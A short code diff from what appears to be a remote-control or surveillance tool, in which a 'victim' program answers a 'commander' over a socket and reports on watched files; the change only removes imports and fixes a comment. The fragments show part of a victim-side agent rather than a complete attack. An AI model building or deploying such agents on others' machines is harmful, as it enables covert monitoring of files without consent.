@@ -1,8 +1,4 @@
-import os
-import queue
-import socket
 import threading
-
 from victim_utils import *
 
 if __name__ == '__main__':
@@ -197,7 +193,7 @@ if __name__ == '__main__':
                         client_socket.send((constants.STATUS_TRUE + "/" +
                                             constants.WATCH_FILE_EXISTS_MSG_TO_CMDR.format(file_path)).encode())
 
-                        # Open a separate thread to monitor commander socket (prevent recv() from program hang)
+                        # Open a separate thread to monitor commander socket (prevent recv() from program hanging)
                         signal_queue = queue.Queue()
                         watch_stop_thread = threading.Thread(target=watch_stop_signal,
                                                              args=(client_socket,
